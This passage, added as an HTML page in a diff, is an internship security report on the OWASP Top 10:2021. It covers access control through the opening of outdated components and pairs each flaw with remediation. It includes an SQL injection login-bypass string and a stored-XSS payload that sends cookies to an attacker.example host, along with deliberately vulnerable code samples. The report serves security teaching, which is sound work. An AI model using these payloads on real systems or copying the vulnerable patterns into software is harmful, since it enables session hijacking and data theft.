@@ -1,0 +1,1061 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OWASP Top 10 — Internship Assessment Report</title>
+<style>
+  :root {
+    --bg: #0b0e14;
+    --panel: #10141d;
+    --panel-alt: #141924;
+    --border: #232a38;
+    --text: #d7dce4;
+    --text-dim: #8b93a3;
+    --heading: #f1f4f9;
+    --accent: #5eb3ff;
+    --accent-2: #7ee0c3;
+    --critical: #ff6b6b;
+    --high: #ffa94d;
+    --medium: #ffd43b;
+    --low: #74c0fc;
+    --code-bg: #0d1117;
+    --mono: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace;
+    --sans: -apple-system, BlinkMacSystemFont, "Segoe UI", Inter, Roboto, sans-serif;
+  }
+
+  * { box-sizing: border-box; }
+
+  body {
+    margin: 0;
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--sans);
+    line-height: 1.65;
+    font-size: 16px;
+  }
+
+  .doc {
+    max-width: 880px;
+    margin: 0 auto;
+    padding: 56px 32px 96px;
+  }
+
+  .cover {
+    border-bottom: 1px solid var(--border);
+    padding-bottom: 36px;
+    margin-bottom: 40px;
+  }
+
+  .cover .eyebrow {
+    text-transform: uppercase;
+    letter-spacing: 0.14em;
+    font-size: 12px;
+    color: var(--accent-2);
+    font-weight: 600;
+  }
+
+  h1 {
+    font-size: 2.1rem;
+    color: var(--heading);
+    font-weight: 700;
+    letter-spacing: -0.01em;
+    margin: 0.4em 0 0.3em;
+    border-bottom: none !important;
+  }
+
+  h2 {
+    font-size: 1.5rem;
+    color: var(--heading);
+    font-weight: 700;
+    margin-top: 2.6em;
+    padding-top: 0.6em;
+    border-top: 1px solid var(--border);
+    letter-spacing: -0.01em;
+  }
+
+  h2:first-of-type { border-top: none; padding-top: 0; }
+
+  h3 {
+    font-size: 1.18rem;
+    color: var(--accent);
+    font-weight: 700;
+    margin-top: 2.2em;
+    padding: 10px 14px;
+    background: var(--panel-alt);
+    border-left: 3px solid var(--accent);
+    border-radius: 4px;
+  }
+
+  p { color: var(--text); margin: 0.9em 0; }
+
+  strong { color: var(--heading); }
+
+  a { color: var(--accent); text-decoration: none; border-bottom: 1px dotted var(--accent); }
+  a:hover { border-bottom-style: solid; }
+
+  ul, ol { padding-left: 1.4em; }
+  li { margin: 0.4em 0; }
+
+  code {
+    font-family: var(--mono);
+    background: var(--code-bg);
+    color: var(--accent-2);
+    padding: 0.15em 0.4em;
+    border-radius: 4px;
+    font-size: 0.88em;
+    border: 1px solid var(--border);
+  }
+
+  pre {
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 18px 20px;
+    overflow-x: auto;
+    margin: 1.2em 0;
+  }
+
+  pre code {
+    background: none;
+    border: none;
+    padding: 0;
+    color: #c9d1d9;
+    font-size: 0.85em;
+    line-height: 1.6;
+  }
+
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 1.4em 0;
+    font-size: 0.92em;
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    overflow: hidden;
+  }
+
+  th, td {
+    padding: 10px 14px;
+    border-bottom: 1px solid var(--border);
+    text-align: left;
+    vertical-align: top;
+  }
+
+  th {
+    background: var(--panel-alt);
+    color: var(--heading);
+    font-weight: 700;
+    font-size: 0.82em;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+  }
+
+  tr:last-child td { border-bottom: none; }
+
+  hr {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 3em 0;
+  }
+
+  .toc-note {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 16px 20px;
+    color: var(--text-dim);
+    font-size: 0.9em;
+    margin: 1.5em 0;
+  }
+
+  @media print {
+    body { background: white; color: #111; }
+    .doc { max-width: 100%; padding: 0 20px; }
+    h3 { background: #f2f2f2; border-left-color: #333; color: #111; }
+    pre, code { background: #f5f5f5; color: #111; border-color: #ccc; }
+    a { color: #111; }
+  }
+
+  @media (max-width: 600px) {
+    .doc { padding: 32px 18px 64px; }
+    h1 { font-size: 1.6rem; }
+  }
+</style>
+</head>
+<body>
+<div class="doc">
+<div class="cover">
+  <div class="eyebrow">Security Assessment &middot; Internship Deliverable</div>
+</div>
+<h1 id="owasp-top-10-web-application-security-risks">OWASP Top 10 Web Application Security Risks</h1>
+<h2 id="internship-assessment-report">Internship Assessment Report</h2>
+<p><strong>Prepared for:</strong> Security Leadership Team
+<strong>Classification:</strong> Internal — Training &amp; Development Deliverable
+<strong>Framework Reference:</strong> OWASP Top 10:2021</p>
+<hr />
+<h2 id="executive-summary">Executive Summary</h2>
+<p>The Open Web Application Security Project (OWASP) Top 10 is the industry-standard awareness document for web application security, published and periodically revised by the OWASP Foundation based on aggregated vulnerability data contributed by security vendors and consulting firms across tens of thousands of applications. It is not a testing checklist in the formal sense, but a <strong>risk categorization framework</strong>: each of the ten entries represents a class of weakness, not a single CVE or a single test case, and each class can manifest through dozens of distinct technical root causes.</p>
+<p>For an organization operating an Application Security (AppSec) or Penetration Testing function, the OWASP Top 10 serves three practical purposes:</p>
+<ol>
+<li><strong>A common vocabulary</strong> between engineering, security, and leadership when discussing risk (e.g., "this finding is an A03 Injection issue" communicates severity and remediation pattern instantly to anyone familiar with the framework).</li>
+<li><strong>A minimum-bar checklist</strong> for secure development — the categories represent the most prevalent and most exploited weakness classes, so an application that has <em>not</em> been assessed against all ten should be treated as unassessed from a baseline-risk perspective.</li>
+<li><strong>A training curriculum</strong> — because each category maps cleanly to a root cause (missing authorization check, unparameterized query, missing encryption, etc.), it is well suited for structured security education, which is the purpose of this internship deliverable.</li>
+</ol>
+<p>This report documents an internship-cycle technical assessment covering all ten categories in the OWASP Top 10:2021 release. For each category, the report provides the technical mechanism of the flaw, its root cause and business impact, a realistic attacker workflow, a vulnerable code or configuration example paired with its secure remediation, and the relevant CWE (Common Weakness Enumeration) mapping used for standardized risk tracking. The report closes with cross-cutting recommendations for embedding these controls into the software development lifecycle (SDLC), and a sign-off summarizing the internship deliverable.</p>
+<p>This document is intended as <strong>original training and reference material</strong> produced during the internship period. Code samples are illustrative (Python/Flask, Node/Express, PHP, SQL, and generic pseudocode where appropriate) rather than drawn from any single production or lab system, so the patterns generalize across technology stacks.</p>
+<hr />
+<h2 id="scope-methodology">Scope &amp; Methodology</h2>
+<h3 id="assessment-scope">Assessment Scope</h3>
+<p>This engagement scope covers <strong>web application security posture</strong> as defined by the OWASP Top 10:2021 categories, applied at three layers:</p>
+<table>
+<thead>
+<tr>
+<th>Layer</th>
+<th>What is examined</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Code level</strong></td>
+<td>Source code patterns that introduce the flaw (unsafe string concatenation, missing validation, hardcoded secrets, insecure deserialization)</td>
+</tr>
+<tr>
+<td><strong>Configuration level</strong></td>
+<td>Server, framework, and infrastructure settings (HTTP security headers, TLS configuration, default credentials, verbose error handling, CORS policy)</td>
+</tr>
+<tr>
+<td><strong>Architectural level</strong></td>
+<td>Design-time decisions (trust boundaries, authorization models, session management strategy, dependency management, logging architecture)</td>
+</tr>
+</tbody>
+</table>
+<h3 id="methodology">Methodology</h3>
+<p>A layered methodology was used, consistent with standard AppSec practice:</p>
+<ol>
+<li><strong>Threat modeling / attack surface mapping</strong> — enumerating entry points (forms, API endpoints, file uploads, authentication flows, third-party integrations) before any active testing.</li>
+<li><strong>Static analysis (SAST)</strong> — source-level review and automated static scanning to catch injection points, hardcoded secrets, and insecure API usage before code reaches runtime.</li>
+<li><strong>Dynamic analysis (DAST)</strong> — runtime testing of the running application using an intercepting proxy (e.g., Burp Suite, OWASP ZAP) to manipulate requests, tamper with parameters, and observe application responses.</li>
+<li><strong>Manual verification and exploitation</strong> — automated scanners produce a high false-positive rate on authorization and business-logic flaws in particular, so every finding in this class of report should be manually confirmed with a proof-of-concept before being recorded as a verified finding.</li>
+<li><strong>Risk rating</strong> — each finding is scored using <strong>CVSS v3.1</strong> (Common Vulnerability Scoring System) to produce a consistent, comparable severity rating, and mapped to a <strong>CWE ID</strong> for taxonomic tracking and trend analysis across assessments.</li>
+<li><strong>Remediation validation</strong> — where possible, proposed fixes are re-tested to confirm the vulnerability class is closed, not just the specific proof-of-concept payload.</li>
+</ol>
+<h3 id="risk-rating-scale-used-in-this-report">Risk Rating Scale Used in This Report</h3>
+<table>
+<thead>
+<tr>
+<th>CVSS Range</th>
+<th>Severity</th>
+<th>Typical Response SLA</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>9.0 – 10.0</td>
+<td>Critical</td>
+<td>Immediate — halt release, patch within 24–48h</td>
+</tr>
+<tr>
+<td>7.0 – 8.9</td>
+<td>High</td>
+<td>Patch within the current sprint / 7 days</td>
+</tr>
+<tr>
+<td>4.0 – 6.9</td>
+<td>Medium</td>
+<td>Patch within the next release cycle / 30 days</td>
+</tr>
+<tr>
+<td>0.1 – 3.9</td>
+<td>Low</td>
+<td>Backlog, address opportunistically</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="detailed-findings-vulnerability-analysis">Detailed Findings &amp; Vulnerability Analysis</h2>
+<p>The following section addresses each of the ten OWASP Top 10:2021 categories in ranked order. Each category is treated as a <strong>class of vulnerability</strong> rather than a single instance, per OWASP's own framing of the list.</p>
+<h3 id="a012021-broken-access-control">A01:2021 — Broken Access Control</h3>
+<p><strong>Technical Definition</strong>
+Broken Access Control occurs when an application fails to properly enforce restrictions on what authenticated (or unauthenticated) users are allowed to do. This includes both <strong>horizontal privilege escalation</strong> (User A accessing User B's resources at the same privilege level, e.g., another customer's order) and <strong>vertical privilege escalation</strong> (a standard user reaching admin-only functionality). The flaw typically arises when authorization checks are performed only in the client (hidden UI elements) or are missing entirely on the server for a specific object/action combination — commonly referred to as an <strong>IDOR (Insecure Direct Object Reference)</strong> when the missing check is on an object identifier such as a user ID, order ID, or file path.</p>
+<p><strong>Root Cause &amp; Impact</strong>
+Root cause is almost always a missing or incorrectly-scoped <strong>server-side authorization check</strong> — the server trusts that a client will only ever request its own data, or trusts a client-supplied identifier (<code>user_id</code>, <code>account_id</code>) without validating it against the authenticated session. Impact ranges from unauthorized data disclosure (viewing other users' PII, orders, medical records) to full account takeover or unauthorized state changes (modifying another user's cart, deleting another user's data, escalating to administrative functions). This is consistently the #1 category in OWASP's data-driven ranking because it is architecturally easy to miss and difficult to catch with automated scanners, which cannot infer "this object belongs to a different user" without business-logic context.</p>
+<p><strong>Real-World Attack Scenario</strong>
+1. Attacker registers a normal account and logs in, receiving session token/cookie for <code>user_id=1042</code>.
+2. Attacker browses to their own order history: <code>GET /api/orders/1042</code> — succeeds as expected.
+3. Attacker intercepts the request with a proxy and decrements the ID: <code>GET /api/orders/1041</code>.
+4. The server returns another customer's full order record (name, address, items, payment last-4) because it only checks that <em>a</em> valid session exists, not that the session owner matches the requested <code>order_id</code>.
+5. Attacker scripts the request across a range of IDs to enumerate the entire order database — a mass data breach achieved with zero exploitation complexity beyond incrementing an integer.</p>
+<p><strong>Vulnerable Code Example</strong></p>
+<pre><code class="language-python"># Flask — vulnerable: no ownership check
+@app.route(&quot;/api/orders/&lt;int:order_id&gt;&quot;)
+@login_required
+def get_order(order_id):
+    order = db.session.query(Order).filter_by(id=order_id).first()
+    return jsonify(order.to_dict())   # returns ANY order, regardless of owner
+</code></pre>
+<p><strong>Remediation &amp; Secure Coding Practice</strong></p>
+<pre><code class="language-python"># Flask — remediated: enforce ownership at the query level
+@app.route(&quot;/api/orders/&lt;int:order_id&gt;&quot;)
+@login_required
+def get_order(order_id):
+    order = db.session.query(Order).filter_by(
+        id=order_id,
+        owner_id=current_user.id          # scope the query to the session owner
+    ).first()
+    if order is None:
+        abort(404)                        # 404, not 403 — avoid confirming existence
+    return jsonify(order.to_dict())
+</code></pre>
+<ul>
+<li>Enforce <strong>deny-by-default</strong> access control: every endpoint denies access unless a rule explicitly grants it.</li>
+<li>Implement authorization checks <strong>centrally</strong> (middleware, decorators, or a policy engine such as OPA) rather than duplicating checks in every handler — duplication is where checks get forgotten.</li>
+<li>Never rely on client-side hiding of buttons/menus as an access control mechanism.</li>
+<li>Use indirect, non-sequential, or per-user object references (e.g., UUIDs, or a signed reference token) so that IDs cannot be trivially enumerated even if a check is missed.</li>
+<li>Log and alert on repeated authorization failures (a signal of enumeration attempts), and rate-limit high-value endpoints.</li>
+</ul>
+<p><strong>CWE Mapping:</strong> CWE-284 (Improper Access Control), CWE-639 (Authorization Bypass Through User-Controlled Key)</p>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Rating</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Typical CVSS</td>
+<td>6.5–8.1 (Medium–High), higher if write access or PII is exposed</td>
+</tr>
+<tr>
+<td>Exploitability</td>
+<td>Low complexity, no special tooling required</td>
+</tr>
+<tr>
+<td>Prevalence</td>
+<td>Highest of all categories in OWASP's 2021 dataset</td>
+</tr>
+</tbody>
+</table>
+<h3 id="a022021-cryptographic-failures">A02:2021 — Cryptographic Failures</h3>
+<p><strong>Technical Definition</strong>
+Cryptographic Failures (formerly "Sensitive Data Exposure") cover any weakness that leads to exposure of sensitive data — credentials, PII, financial data, session tokens, health records — through the absence of encryption, use of weak/deprecated algorithms, improper key management, or transmission over unencrypted channels. This category was renamed in the 2021 revision specifically to shift focus from the <em>symptom</em> (data exposure) to the <em>root cause</em> (failures in how cryptography is applied).</p>
+<p><strong>Root Cause &amp; Impact</strong>
+Root causes include: transmitting sensitive data over plain HTTP instead of TLS; storing passwords with fast general-purpose hashes (MD5, SHA-1, or even unsalted SHA-256) instead of a slow, salted, purpose-built KDF (bcrypt, scrypt, Argon2); using weak or hardcoded encryption keys committed to source control; disabling certificate validation "temporarily" for testing and shipping it; and storing sensitive data that does not need to be retained at all. Impact is direct and severe: a database breach that would otherwise expose only opaque hashes instead exposes plaintext-equivalent credentials, enabling credential-stuffing attacks against every other service the same users reused that password on.</p>
+<p><strong>Real-World Attack Scenario</strong>
+1. Attacker gains read access to a database backup (via a separate misconfiguration, insider threat, or SQL injection elsewhere in the stack).
+2. The <code>users</code> table stores passwords as unsalted MD5 hashes.
+3. Attacker loads the hash dump into a GPU-accelerated cracking tool (e.g., hashcat) against a precomputed rainbow table or wordlist — unsalted MD5 can be cracked at billions of hashes per second and rainbow tables exist for the entire common-password space.
+4. Within hours, the majority of user passwords are recovered in plaintext.
+5. Attacker uses the recovered credentials in <strong>credential-stuffing</strong> attacks against unrelated high-value services (banking, email) where users reused the same password, because the original service's weak hashing choice has now compromised accounts the attacker never directly targeted.</p>
+<p><strong>Vulnerable Code Example</strong></p>
+<pre><code class="language-python"># Vulnerable: fast hash, no salt, no work factor
+import hashlib
+
+def store_password(password: str) -&gt; str:
+    return hashlib.md5(password.encode()).hexdigest()
+</code></pre>
+<pre><code># Vulnerable configuration: TLS disabled / cert validation off
+requests.get(&quot;https://api.internal.example.com/data&quot;, verify=False)
+</code></pre>
+<p><strong>Remediation &amp; Secure Coding Practice</strong></p>
+<pre><code class="language-python"># Remediated: bcrypt — salted, adaptive work factor
+import bcrypt
+
+def store_password(password: str) -&gt; bytes:
+    return bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
+
+def verify_password(password: str, stored_hash: bytes) -&gt; bool:
+    return bcrypt.checkpw(password.encode(), stored_hash)
+</code></pre>
+<ul>
+<li>Encrypt sensitive data <strong>in transit</strong> (enforce TLS 1.2+ everywhere, HSTS header, no mixed content) and <strong>at rest</strong> (AES-256-GCM for data-at-rest, with keys managed by a dedicated KMS/HSM, never hardcoded or committed to a repository).</li>
+<li>Use a purpose-built password hashing algorithm (bcrypt, scrypt, or Argon2id) — never a general-purpose fast hash (MD5, SHA-1, SHA-256) for password storage.</li>
+<li>Classify data and apply the principle of <strong>minimization</strong>: don't collect or retain sensitive data you don't need (e.g., don't store full card numbers if a tokenized reference from the payment processor suffices).</li>
+<li>Rotate keys and secrets on a defined schedule, and never embed secrets in source code — use a secrets manager (Vault, AWS Secrets Manager, Azure Key Vault).</li>
+<li>Disable weak TLS/SSL protocol versions and cipher suites at the load balancer/web server level.</li>
+</ul>
+<p><strong>CWE Mapping:</strong> CWE-326 (Inadequate Encryption Strength), CWE-327 (Use of a Broken or Risky Cryptographic Algorithm), CWE-311 (Missing Encryption of Sensitive Data)</p>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Rating</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Typical CVSS</td>
+<td>7.5–9.1 (High–Critical) when credentials or financial data are involved</td>
+</tr>
+<tr>
+<td>Exploitability</td>
+<td>Low once data is obtained; offline cracking is trivial for weak hashes</td>
+</tr>
+<tr>
+<td>Prevalence</td>
+<td>Very common in legacy systems and rushed MVPs</td>
+</tr>
+</tbody>
+</table>
+<h3 id="a032021-injection">A03:2021 — Injection</h3>
+<p><strong>Technical Definition</strong>
+Injection flaws occur when untrusted input is concatenated directly into an interpreter's command or query string — SQL, NoSQL, OS shell commands, LDAP queries, or XPath expressions — allowing the attacker-supplied data to be interpreted as <strong>code/control syntax</strong> rather than <strong>data</strong>. Cross-Site Scripting (XSS) is now formally folded into this category in the 2021 revision, as it is fundamentally the same root cause applied to the browser's HTML/JS interpreter rather than a database.</p>
+<p><strong>Root Cause &amp; Impact</strong>
+The root cause is the absence of a strict boundary between the "data" channel and the "control" channel when constructing a query or command — typically achieved via naive string concatenation or f-strings/template literals instead of parameterized APIs. Impact for SQL injection specifically can be catastrophic: full database read/write access, authentication bypass, and in some database configurations (e.g., MySQL with <code>FILE</code> privilege, or MSSQL <code>xp_cmdshell</code>), remote code execution on the underlying host. For XSS, impact includes session hijacking via cookie theft, credential phishing via DOM manipulation, and drive-by malware delivery to every visitor of the affected page.</p>
+<p><strong>Real-World Attack Scenario — SQL Injection (Authentication Bypass)</strong>
+1. Attacker locates a login form that builds its query via string concatenation.
+2. Attacker submits username: <code>admin' --</code> and any password value.
+3. The resulting query becomes <code>SELECT * FROM users WHERE username='admin' -- ' AND password='...'</code> — the <code>--</code> comments out the password check entirely.
+4. The application authenticates the attacker as <code>admin</code> with no valid credentials.
+5. Attacker escalates by using a <code>UNION SELECT</code> injection in a search field to exfiltrate the entire <code>users</code> table, including password hashes, through the application's own search results display.</p>
+<p><strong>Real-World Attack Scenario — Stored XSS</strong>
+1. Attacker submits a product review containing <code>&lt;script&gt;fetch('https://attacker.example.com/c?c='+document.cookie)&lt;/script&gt;</code> on a review field that is rendered without encoding.
+2. The payload is stored in the database and rendered, unescaped, to every subsequent visitor of that product page.
+3. Each visitor's browser silently executes the script, exfiltrating their session cookie to the attacker's server.
+4. Attacker replays the stolen session cookies to hijack active user sessions without needing any password.</p>
+<p><strong>Vulnerable Code Example</strong></p>
+<pre><code class="language-python"># SQL Injection — string concatenation
+query = f&quot;SELECT * FROM users WHERE username='{username}' AND password='{password}'&quot;
+cursor.execute(query)
+</code></pre>
+<pre><code class="language-javascript">// Stored XSS — unescaped output
+element.innerHTML = userSuppliedReviewText;
+</code></pre>
+<p><strong>Remediation &amp; Secure Coding Practice</strong></p>
+<pre><code class="language-python"># Remediated — parameterized query, never string-built
+query = &quot;SELECT * FROM users WHERE username = %s AND password_hash = %s&quot;
+cursor.execute(query, (username, hash_password(password)))
+</code></pre>
+<pre><code class="language-javascript">// Remediated — safe text insertion, framework auto-escaping
+element.textContent = userSuppliedReviewText;
+// Or, in a framework: React/Vue/Angular auto-escape by default —
+// avoid dangerouslySetInnerHTML / v-html unless content is sanitized (e.g., DOMPurify)
+</code></pre>
+<ul>
+<li>Use <strong>parameterized queries / prepared statements</strong> or an ORM's query builder for all database access — never concatenate untrusted input into SQL, NoSQL, or shell commands.</li>
+<li>Apply <strong>contextual output encoding</strong> for anything rendered into HTML, JavaScript, URL, or CSS contexts; rely on the templating framework's default auto-escaping rather than manually building markup strings.</li>
+<li>Implement a strict <strong>Content-Security-Policy</strong> header (<code>script-src 'self'</code>) as a defense-in-depth layer that blocks inline script execution even if an XSS payload slips through.</li>
+<li>Apply <strong>allow-list input validation</strong> at the boundary (expected format, length, character set) in addition to output encoding — validation alone is not sufficient defense against injection, but reduces attack surface.</li>
+<li>Use least-privilege database accounts for the application (no <code>DROP</code>, <code>FILE</code>, or admin grants on the application's runtime DB user).</li>
+</ul>
+<p><strong>CWE Mapping:</strong> CWE-89 (SQL Injection), CWE-79 (Cross-Site Scripting), CWE-78 (OS Command Injection)</p>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Rating</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Typical CVSS</td>
+<td>8.0–9.8 (High–Critical) for SQLi with data access; 5.0–7.0 (Medium–High) for reflected/stored XSS depending on impact</td>
+</tr>
+<tr>
+<td>Exploitability</td>
+<td>Low complexity — extensively tooled (sqlmap, Burp Scanner)</td>
+</tr>
+<tr>
+<td>Prevalence</td>
+<td>Declining in modern frameworks with safe defaults, still common in legacy and hand-rolled query code</td>
+</tr>
+</tbody>
+</table>
+<h3 id="a042021-insecure-design">A04:2021 — Insecure Design</h3>
+<p><strong>Technical Definition</strong>
+Insecure Design is a new 2021 category distinct from <em>implementation</em> bugs — it addresses flaws baked into the application's <strong>architecture and business logic</strong> before a single line of code is written. A perfectly-implemented feature can still be insecure if the underlying design never accounted for abuse cases (e.g., a password-reset flow with no rate limiting by design, or a discount-code system with no business-logic limit on redemption count).</p>
+<p><strong>Root Cause &amp; Impact</strong>
+Root cause is the absence of <strong>threat modeling</strong> and <strong>secure design patterns</strong> during the requirements and architecture phase — security is treated as a code-review checklist item rather than a design constraint. Impact varies widely by the specific business logic involved, but commonly includes financial loss (abuse of pricing/discount logic), account takeover (weak-by-design recovery flows), and resource exhaustion (missing rate limits by design, not by accident).</p>
+<p><strong>Real-World Attack Scenario</strong>
+1. An e-commerce platform's checkout allows entering a quantity field with no server-side lower-bound validation, because the design assumed the UI's minimum-quantity spinner control would always be respected.
+2. Attacker intercepts the checkout request and sets quantity to <code>-5</code> for a high-value item.
+3. The total-price calculation (<code>unit_price * quantity</code>) legitimately computes a negative total.
+4. The payment/wallet integration processes the negative total as a <strong>credit to the attacker's account</strong> rather than a charge, because refund/credit logic was never designed to distinguish "returning a negative-price purchase" from "processing a normal refund."
+5. Attacker repeats the transaction to drain the platform's wallet balance — a pure business-logic exploit that no amount of secure <em>coding</em> prevents, because the flaw is in the <em>design</em> (no business rule stating "quantity and computed total must be positive integers").</p>
+<p><strong>Vulnerable Design Pattern</strong></p>
+<pre><code>Design assumption (undocumented, untested):
+&quot;Quantity will always be &gt;= 1 because the UI enforces it.&quot;
+
+Consequence: server-side logic has no independent invariant check —
+the trust boundary between client and server was never modeled.
+</code></pre>
+<p><strong>Remediation &amp; Secure Coding Practice</strong></p>
+<pre><code class="language-python"># Remediated — business invariant enforced server-side, independent of UI
+def calculate_total(unit_price: Decimal, quantity: int) -&gt; Decimal:
+    if quantity &lt; 1 or quantity &gt; MAX_QTY_PER_ORDER:
+        raise InvalidOrderError(&quot;Quantity must be a positive integer within allowed limits&quot;)
+    total = unit_price * quantity
+    if total &lt;= 0:
+        raise InvalidOrderError(&quot;Computed total must be positive&quot;)
+    return total
+</code></pre>
+<ul>
+<li>Adopt <strong>threat modeling</strong> (e.g., STRIDE) as a mandatory step during design/architecture review, before implementation begins — identify abuse cases, not just intended-use cases.</li>
+<li>Define and enforce <strong>business logic invariants</strong> server-side (minimum/maximum quantities, rate limits, sequential-workflow enforcement) independent of any client-side control.</li>
+<li>Use <strong>secure design patterns</strong> as defaults: fail-secure error handling, segregation of tiers/trust zones, and limiting resource consumption per user/session.</li>
+<li>Maintain a library of vetted, reusable secure components (auth, payment, file handling) so teams are not re-solving hard security problems ad hoc in every feature.</li>
+<li>Conduct design-phase security reviews for any feature that touches money, authentication, or access control before it reaches implementation.</li>
+</ul>
+<p><strong>CWE Mapping:</strong> CWE-841 (Improper Enforcement of Behavioral Workflow), CWE-840 (Business Logic Errors)</p>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Rating</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Typical CVSS</td>
+<td>Highly variable — 4.0–9.0 depending on business impact</td>
+</tr>
+<tr>
+<td>Exploitability</td>
+<td>Often low complexity, but requires business-context understanding — poorly caught by automated scanners</td>
+</tr>
+<tr>
+<td>Prevalence</td>
+<td>Under-reported historically because it requires manual, context-aware testing to find</td>
+</tr>
+</tbody>
+</table>
+<h3 id="a052021-security-misconfiguration">A05:2021 — Security Misconfiguration</h3>
+<p><strong>Technical Definition</strong>
+Security Misconfiguration covers any gap between an application/infrastructure's <strong>actual</strong> configuration and its <strong>secure baseline</strong> — unnecessary features enabled, default credentials left in place, verbose error messages leaking stack traces, missing security headers, overly permissive CORS policies, or cloud storage buckets left publicly accessible. Unlike a code-level bug, misconfiguration flaws exist purely in <em>settings</em>, which makes them common because they require ongoing operational discipline rather than a one-time code fix.</p>
+<p><strong>Root Cause &amp; Impact</strong>
+Root causes include: shipping development/debug settings to production (verbose stack traces, debug consoles like Werkzeug's interactive debugger, or Django's <code>DEBUG=True</code>); leaving default admin credentials unchanged on infrastructure components; missing HTTP security headers; and overly permissive cloud IAM policies or storage bucket ACLs. Impact ranges from information disclosure (stack traces revealing internal file paths, library versions, and database schema) to full remote code execution — a Flask/Django debug console left enabled in production, for instance, allows arbitrary Python execution directly through the error page.</p>
+<p><strong>Real-World Attack Scenario</strong>
+1. Attacker triggers a server error on a production endpoint (e.g., malformed input causing an unhandled exception).
+2. The application, still running with <code>DEBUG=True</code>, returns a full interactive debugger page (Werkzeug/Django) instead of a generic error message.
+3. This debugger exposes a PIN-protected but often-guessable or brute-forceable console that allows arbitrary Python code execution directly in the browser.
+4. Attacker uses the console to read environment variables (often containing database credentials and API keys) and, ultimately, achieves remote code execution on the host.
+5. Separately, the same organization's S3 bucket used for static assets is discovered to have <code>List</code> and <code>Read</code> permissions open to "Authenticated Users" (interpreted by AWS as <em>any AWS account</em>, not just the organization's own users), exposing internal build artifacts and configuration backups to anyone with an AWS account.</p>
+<p><strong>Vulnerable Configuration Example</strong></p>
+<pre><code class="language-python"># Flask — vulnerable production configuration
+app.config['DEBUG'] = True   # exposes interactive debugger + full stack traces
+</code></pre>
+<pre><code># Vulnerable HTTP response headers (missing hardening)
+HTTP/1.1 200 OK
+Server: Apache/2.4.41 (Ubuntu)
+X-Powered-By: PHP/7.2.3
+# No Content-Security-Policy, X-Frame-Options, or Strict-Transport-Security
+</code></pre>
+<p><strong>Remediation &amp; Secure Coding Practice</strong></p>
+<pre><code class="language-python"># Remediated — debug disabled, generic error handling in production
+app.config['DEBUG'] = False
+
+@app.errorhandler(500)
+def internal_error(e):
+    log.exception(&quot;Unhandled exception&quot;)   # detail goes to server-side logs only
+    return jsonify({&quot;error&quot;: &quot;An internal error occurred&quot;}), 500
+</code></pre>
+<pre><code># Remediated — hardened security headers
+Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
+Content-Security-Policy: default-src 'self'
+X-Content-Type-Options: nosniff
+X-Frame-Options: DENY
+Referrer-Policy: strict-origin-when-cross-origin
+Server: (suppressed / generic value)
+</code></pre>
+<ul>
+<li>Maintain a <strong>repeatable, automated hardening baseline</strong> (infrastructure-as-code, configuration-as-code) rather than manual server setup, so every environment is provisioned identically and auditable.</li>
+<li>Disable and remove unnecessary features, sample applications, default accounts, and verbose framework debug modes before any production deployment.</li>
+<li>Enforce standard security headers (CSP, HSTS, X-Content-Type-Options, X-Frame-Options, Referrer-Policy) at the web server/gateway layer as a fleet-wide default.</li>
+<li>Run periodic automated configuration audits (cloud security posture management tooling, CIS Benchmark scans) against all environments, not just at initial deployment.</li>
+<li>Segment environments so that no development/debug configuration can ever reach the production network by accident (separate credentials, separate deployment pipelines).</li>
+</ul>
+<p><strong>CWE Mapping:</strong> CWE-16 (Configuration), CWE-2 (Environmental Security Flaws), CWE-209 (Information Exposure Through an Error Message)</p>
+<table>
+<thead>
+<tr>
+<th>Attribute</th>
+<th>Rating</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Typical CVSS</td>
+<td>5.3–9.8, depending on whether the misconfiguration yields RCE (debug consoles) or information disclosure</td>
+</tr>
+<tr>
+<td>Exploitability</td>
+<td>Frequently trivial — no custom exploit development required</td>
+</tr>
+<tr>
+<td>Prevalence</td>
+<td>Very common; increases with infrastructure complexity and multi-cloud sprawl</td>
+</tr>
+</tbody>
+</table>
+<h3 id="a062021-vulnerable-and-outdated-components">A06:2021 — Vulnerable and Outdated Components</h3>
+<p><strong>Technical Definition</strong>
+This category covers risk introduced by using third-party libraries, frameworks, and runtime components (npm packages, Python packages, OS-level libraries, container base images) that contain known vulnerabilities, are unsupported/end-of-life, or are pulled from unverified sources without integrity checking. Modern applications are assembled from dozens to hundreds of transitive dependencies, and the application's own code is often a small fraction of its total attack surface.</p>
+<p><strong>Root Cause &amp; Impact</strong>
+Root cause is the absence of a disciplined <strong>software composition management</strong> process: no dependency inventory, no automated vulnerability scanning of dependencies, no patch cadence, and no visibility into <em>transitive</em> dependencies (a dependency of a dependency). Impact is bounded only by what the vulnerable component itself can do — a vulnerable deserialization library can yield remote code execution; a vulnerable logging library can yield RCE via crafted log input (as demonstrated at internet scale by the Log4Shell vulnerability in Log4j); a vulnerable image-processing library can yield server-side request forgery or memory corruption.</p>
+<p><strong>Real-World Attack Scenario</strong>
+1. Attacker fingerprints the target application's technology stack via response headers, JS bundle contents, and error messages, identifying a specific outdated library version.
